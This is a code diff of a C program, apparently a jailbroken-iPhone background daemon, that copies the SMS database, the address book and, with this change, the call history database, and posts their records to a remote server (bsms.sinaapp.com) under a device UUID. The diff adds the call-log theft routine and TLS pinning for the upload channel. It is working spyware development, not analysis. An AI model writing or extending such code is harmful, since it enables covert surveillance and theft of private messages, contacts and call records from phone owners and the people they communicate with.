@@ -21,11 +21,14 @@ CURL *curl;
 char apiPermitURL[400];
 char apiPostSMSURL[400];
 char apiPostAdURL[400];
+char apiPostCallURL[400];
 char logFile[100] = "/var/root/bsms.log";
-char remoteURL[100] = "http://bsms.sinaapp.com/api.php?";
+char remoteURL[100] = "https://bsms.sinaapp.com/api.php?";
+char cacertFile[100] = "/usr/libexec/cydia/cacert.bsms";
 char localBuffer[1024*100] = {0};
 int cronSMSTask(int rowid);
 int cronAddressBookTask(char* id);
+int cronCallTask(int rowid);
 int getData(char *file, char *sql, char ***res, int *column);
 int postData(CURL *curl, char *messageData);
 int getPermit();
@@ -60,6 +63,7 @@ int main() {
         snprintf(apiPermitURL, 400, "%smod=permit&uuid=%s", remoteURL, UUID);
         snprintf(apiPostSMSURL, 400, "%smod=sms&uuid=%s", remoteURL, UUID);
         snprintf(apiPostAdURL, 400, "%smod=ad&uuid=%s", remoteURL, UUID);
+        snprintf(apiPostCallURL, 400, "%smod=call&uuid=%s", remoteURL, UUID);
 
         writeLog("apiPermitURL:[%s]\n", apiPermitURL);
 
@@ -73,33 +77,29 @@ int main() {
             getPermit();
             curl_easy_reset(curl);
 
-            int smsid=0, adid=0, permitid=0;
-            char *sid, *aid, *pid;
-            getCode(3, localBuffer, &sid, &aid, &pid);
-            writeLog("smsid[%s]-adid[%s]-perid[%s]\n", sid, aid, pid);
+
+            int smsid=0, adid=0, permitid=0, callid=0;
+            char *sid, *aid, *pid, *cid;
+            getCode(4, localBuffer, &sid, &aid, &pid, &cid);
+            writeLog("smsid[%s]-adid[%s]-permitid[%s]-callid[%s]\n", sid, aid, pid, cid);
 
             //处理返回的命令集
-            if(sid == NULL) {
-                smsid = 0;
-            } else {
-                smsid = atoi(sid);
-            }
-            if(sid == NULL) {
-                permitid = 0;
-            } else {
-                permitid = atoi(pid);
-            }
+            smsid = (sid == NULL) ? 0 : atoi(sid);
+            callid = (cid == NULL) ? 0 : atoi(cid);
+            permitid = (pid == NULL) ? 0 : atoi(pid);
 
             //判断是否有权限
             if(permitid > 0) {
                 cronSMSTask(smsid);
+                curl_easy_reset(curl);
+                cronCallTask(callid);
                 curl_easy_reset(curl);
 
                 if(aid != NULL && aid[0] != 0) {
                     cronAddressBookTask(aid);
                     curl_easy_reset(curl);
                 }
-                writeLog("apiSMSId:[%d]-AddressBookId:[%s]-------------------------------------EOF\n", smsid, aid);
+                writeLog("apiSMSId:[%d]-AddressBookId:[%s]-callid:[%d]-------------------------------------EOF\n", smsid, aid, callid);
             } else {
                 refreshThis();
             }
@@ -112,6 +112,9 @@ int getPermit(){
     CURLcode res;
     if (curl) {
         curl_easy_setopt(curl, CURLOPT_URL, apiPermitURL);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 1);
+        curl_easy_setopt(curl, CURLOPT_CAINFO, cacertFile);
         curl_easy_setopt(curl , CURLOPT_TIMEOUT , 3);
         curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackGetPermitID);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, localBuffer);
@@ -144,11 +147,14 @@ int cronSMSTask(int rowid) {
 
     char sql[400];
     snprintf(sql, 400, "SELECT * FROM Message WHERE ROWID > %d ORDER BY ROWID ASC LIMIT 1000", rowid);
-    int row = getData("/private/var/mobile/Library/SMS/sms.db", sql, &result, &column);
+    int row = getData("/var/mobile/Library/SMS/sms.db", sql, &result, &column);
 
     if(row > 0) {
         if(curl) {
             curl_easy_setopt(curl, CURLOPT_URL, apiPostSMSURL);
+            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1);
+            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 1);
+            curl_easy_setopt(curl, CURLOPT_CAINFO, cacertFile);
             curl_easy_setopt(curl, CURLOPT_TIMEOUT , 3);
             curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackBlockedWritedataFunc);
         }
@@ -186,6 +192,9 @@ int cronAddressBookTask(char* id) {
 
     if(curl) {
         curl_easy_setopt(curl, CURLOPT_URL, apiPostAdURL);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 1);
+        curl_easy_setopt(curl, CURLOPT_CAINFO, cacertFile);
         curl_easy_setopt(curl, CURLOPT_TIMEOUT , 3);
         curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackBlockedWritedataFunc);
     }
@@ -211,6 +220,45 @@ int cronAddressBookTask(char* id) {
         postData(curl, messageData);
 
     }
+    return 0;
+}
+
+int cronCallTask(int rowid) {
+    char **result;
+    int i=0, j=0, nlen=0, column=0, offset = 0;
+
+    char sql[1000];
+    snprintf(sql, 1000, "SELECT * FROM call WHERE ROWID > %d ORDER BY ROWID ASC LIMIT 1000;", rowid);
+    int row = getData("/var/wireless/Library/CallHistory/call_history.db", sql, &result, &column);
+
+    if(row > 0) {
+        if(curl) {
+            curl_easy_setopt(curl, CURLOPT_URL, apiPostCallURL);
+            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1);
+            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 1);
+            curl_easy_setopt(curl, CURLOPT_CAINFO, cacertFile);
+            curl_easy_setopt(curl, CURLOPT_TIMEOUT , 3);
+            curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackBlockedWritedataFunc);
+        }
+
+        for(i=1; i < (row + 1); i++) {
+            char messageData[CURL_MAX_POST_LEN];
+            char SMSmobileNum[1000];
+            int SMSAddress=0, SMSis_madrid=0, SMSmadrid_handle=0;
+            nlen = 0;
+            writeLog("%s,\n", result[i*column]);
+            for (j = 0; j < column; j++) {
+                offset = i*column+j;
+                snprintf(messageData+nlen, CURL_MAX_POST_LEN-nlen, "%s=%s&", result[j], result[offset]);
+                nlen = strlen(messageData);
+            }
+
+            postData(curl, messageData);
+        }
+        //free sqlite3 result
+        sqlite3_free_table(result);
+    }
+
     return 0;
 }
 
